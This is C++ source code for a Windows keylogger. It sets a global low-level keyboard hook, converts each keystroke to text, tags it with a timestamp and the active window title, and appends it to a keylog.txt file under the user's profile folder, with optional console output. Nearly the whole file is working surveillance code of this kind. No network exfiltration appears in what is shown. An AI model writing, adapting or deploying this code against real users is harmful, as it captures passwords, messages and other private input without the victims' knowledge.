#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include "config.h"
#include <ctime>
#include <cstdlib>

#define MY_MAX_PATH 260

#pragma execution_character_set("utf-8")

static char location[MY_MAX_PATH] = {0};
static char last_name[MY_MAX_PATH] = {0};

void writeBOMIfNeeded(const char *filename)
{
    struct stat buffer;
    if (stat(filename, &buffer) != 0)
    {
        std::ofstream file(filename, std::ios::binary);
        const unsigned char bom[] = {0xEF, 0xBB, 0xBF};
        file.write(reinterpret_cast<const char *>(bom), 3);
        file.close();
    }
}

void getActiveWindowTitle(char *buffer, int size)
{
    HWND hWindow = GetForegroundWindow();
    if (hWindow)
    {
        int txtlen = GetWindowTextLengthA(hWindow);
        if (txtlen > 0 && txtlen < size)
        {
            GetWindowTextA(hWindow, buffer, size);
        }
        else
        {
            buffer[0] = '\0';
        }
    }
    else
    {
        buffer[0] = '\0';
    }
}

char mapVkCodeToChar(DWORD vkCode, bool shift)
{
    switch (vkCode)
    {
    case '1':
        return shift ? '!' : '1';
    case '2':
        return shift ? '@' : '2';
    case '3':
        return shift ? '#' : '3';
    case '4':
        return shift ? '$' : '4';
    case '5':
        return shift ? '%' : '5';
    case '6':
        return shift ? '^' : '6';
    case '7':
        return shift ? '&' : '7';
    case '8':
        return shift ? '*' : '8';
    case '9':
        return shift ? '(' : '9';
    case '0':
        return shift ? ')' : '0';
    case VK_OEM_1:
        return shift ? ':' : ';';
    case VK_OEM_PLUS:
        return shift ? '+' : '=';
    case VK_OEM_COMMA:
        return shift ? '<' : ',';
    case VK_OEM_MINUS:
        return shift ? '_' : '-';
    case VK_OEM_PERIOD:
        return shift ? '>' : '.';
    case VK_OEM_2:
        return shift ? '?' : '/';
    case VK_OEM_3:
        return shift ? '~' : '`';
    case VK_OEM_4:
        return shift ? '{' : '[';
    case VK_OEM_5:
        return shift ? '|' : '\\';
    case VK_OEM_6:
        return shift ? '}' : ']';
    case VK_OEM_7:
        return shift ? '"' : '\'';
    default:
        return 0;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        std::ofstream myfile(location, std::ios::app | std::ios::binary);
        char name[MY_MAX_PATH] = {0};
        getActiveWindowTitle(name, MY_MAX_PATH);
        if (strncmp(name, last_name, MY_MAX_PATH) != 0)
        {
            strncpy(last_name, name, MY_MAX_PATH);
            time_t now = time(0);
            struct tm tstruct;
            memset(&tstruct, 0, sizeof(tstruct));
            localtime_s(&tstruct, &now);
            char timebuf[32];
            strftime(timebuf, sizeof(timebuf), "%d.%m.%Y %H:%M:%S", &tstruct);
            std::string header = std::string("[") + timebuf + "] в " + last_name + "\n";
            if (logToFile == true)
            {
                myfile << header;
            }
            if (logToConsole == true)
            {
                std::cout << header;
            }
        }
        time_t now = time(0);
        struct tm tstruct;
        memset(&tstruct, 0, sizeof(tstruct));
        localtime_s(&tstruct, &now);
        char timebuf[32];
        strftime(timebuf, sizeof(timebuf), "%d.%m.%Y %H:%M:%S", &tstruct);
        std::string prefix = std::string("[") + timebuf + "] ";
        HWND foreground = GetForegroundWindow();
        DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
        HKL layout = GetKeyboardLayout(threadId);
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        wchar_t wbuf[4] = {0};
        UINT scanCode = MapVirtualKeyEx(p->vkCode, MAPVK_VK_TO_VSC, layout);
        int result = ToUnicodeEx(p->vkCode, scanCode, keyboardState, wbuf, 4, 0, layout);
        if (result > 0)
        {
            for (int i = 0; i < result; ++i)
            {
                char utf8buf[8] = {0};
                int len = WideCharToMultiByte(CP_UTF8, 0, &wbuf[i], 1, utf8buf, 8, NULL, NULL);
                if (len > 0)
                {
                    if (logToFile == true)
                    {
                        myfile << prefix << std::string(utf8buf, len) << "\n";
                    }
                    if (logToConsole == true)
                    {
                        std::cout << prefix << std::string(utf8buf, len) << std::endl;
                    }
                }
            }
        }
        else
        {
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            char ch = mapVkCodeToChar(p->vkCode, shift);
            if (ch)
            {
                if (logToFile == true)
                {
                    myfile << prefix << ch << "\n";
                }
                if (logToConsole == true)
                {
                    std::cout << prefix << ch << std::endl;
                }
            }
            else
            {
                std::string keyStr;
                switch (p->vkCode)
                {
                case VK_RETURN:
                    keyStr = "[Enter]";
                    break;
                case VK_TAB:
                    keyStr = "[Tab]";
                    break;
                case VK_BACK:
                    keyStr = "[Backspace]";
                    break;
                case VK_LEFT:
                    keyStr = "[Left]";
                    break;
                case VK_RIGHT:
                    keyStr = "[Right]";
                    break;
                case VK_UP:
                    keyStr = "[Up]";
                    break;
                case VK_DOWN:
                    keyStr = "[Down]";
                    break;
                case VK_SHIFT:
                    keyStr = "[Shift]";
                    break;
                case VK_LSHIFT:
                    keyStr = "[LShift]";
                    break;
                case VK_RSHIFT:
                    keyStr = "[RShift]";
                    break;
                case VK_CONTROL:
                    keyStr = "[Ctrl]";
                    break;
                case VK_LCONTROL:
                    keyStr = "[LCtrl]";
                    break;
                case VK_RCONTROL:
                    keyStr = "[RCtrl]";
                    break;
                case VK_MENU:
                    keyStr = "[Alt]";
                    break;
                case VK_LMENU:
                    keyStr = "[LAlt]";
                    break;
                case VK_RMENU:
                    keyStr = "[RAlt]";
                    break;
                case VK_CAPITAL:
                    keyStr = "[CapsLock]";
                    break;
                case VK_DELETE:
                    keyStr = "[Delete]";
                    break;
                case VK_PRINT:
                    keyStr = "[Print]";
                    break;
                case VK_END:
                    keyStr = "[End]";
                    break;
                case VK_INSERT:
                    keyStr = "[Insert]";
                    break;
                case VK_HOME:
                    keyStr = "[Home]";
                    break;
                case VK_PRIOR:
                    keyStr = "[PgUp]";
                    break;
                case VK_NEXT:
                    keyStr = "[PgDn]";
                    break;
                case VK_ESCAPE:
                    keyStr = "[Esc]";
                    break;
                case VK_SPACE:
                    keyStr = "[Space]";
                    break;
                case VK_SNAPSHOT:
                    keyStr = "[PrtScr]";
                    break;
                case VK_SCROLL:
                    keyStr = "[ScrollLock]";
                    break;
                case VK_PAUSE:
                    keyStr = "[Pause]";
                    break;
                case VK_NUMLOCK:
                    keyStr = "[NumLock]";
                    break;
                case VK_F1:
                    keyStr = "[F1]";
                    break;
                case VK_F2:
                    keyStr = "[F2]";
                    break;
                case VK_F3:
                    keyStr = "[F3]";
                    break;
                case VK_F4:
                    keyStr = "[F4]";
                    break;
                case VK_F5:
                    keyStr = "[F5]";
                    break;
                case VK_F6:
                    keyStr = "[F6]";
                    break;
                case VK_F7:
                    keyStr = "[F7]";
                    break;
                case VK_F8:
                    keyStr = "[F8]";
                    break;
                case VK_F9:
                    keyStr = "[F9]";
                    break;
                case VK_F10:
                    keyStr = "[F10]";
                    break;
                case VK_F11:
                    keyStr = "[F11]";
                    break;
                case VK_F12:
                    keyStr = "[F12]";
                    break;
                case VK_LWIN:
                    keyStr = "[LWin]";
                    break;
                case VK_RWIN:
                    keyStr = "[RWin]";
                    break;
                case VK_APPS:
                    keyStr = "[Apps]";
                    break;
                case VK_OEM_1:
                    keyStr = shift ? ":" : ";";
                    break;
                case VK_OEM_PLUS:
                    keyStr = shift ? "+" : "=";
                    break;
                case VK_OEM_COMMA:
                    keyStr = shift ? "<" : ",";
                    break;
                case VK_OEM_MINUS:
                    keyStr = shift ? "_" : "-";
                    break;
                case VK_OEM_PERIOD:
                    keyStr = shift ? ">" : ".";
                    break;
                case VK_OEM_2:
                    keyStr = shift ? "?" : "/";
                    break;
                case VK_OEM_3:
                    keyStr = shift ? "~" : "`";
                    break;
                case VK_OEM_4:
                    keyStr = shift ? "{" : "[";
                    break;
                case VK_OEM_5:
                    keyStr = shift ? "|" : "\\";
                    break;
                case VK_OEM_6:
                    keyStr = shift ? "}" : "]";
                    break;
                case VK_OEM_7:
                    keyStr = shift ? "\"" : "'";
                    break;
                case VK_OEM_102:
                    keyStr = "[OEM_102]";
                    break;
                default:
                    break;
                }
                if (!keyStr.empty())
                {
                    if (logToFile == true)
                    {
                        myfile << prefix << keyStr << "\n";
                    }
                    if (logToConsole == true)
                    {
                        std::cout << prefix << keyStr << std::endl;
                    }
                }
            }
        }
        myfile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI Keylogger_main(LPVOID lpParameter);
DWORD WINAPI Keylogger_main(LPVOID lpParameter)
{
    char tempPath[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, tempPath);
    const char *userProfilePath = std::getenv("USERPROFILE");
    snprintf(location, MY_MAX_PATH, "%s\\ILU\\keylog.txt", userProfilePath);
    writeBOMIfNeeded(location);
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}

int main();
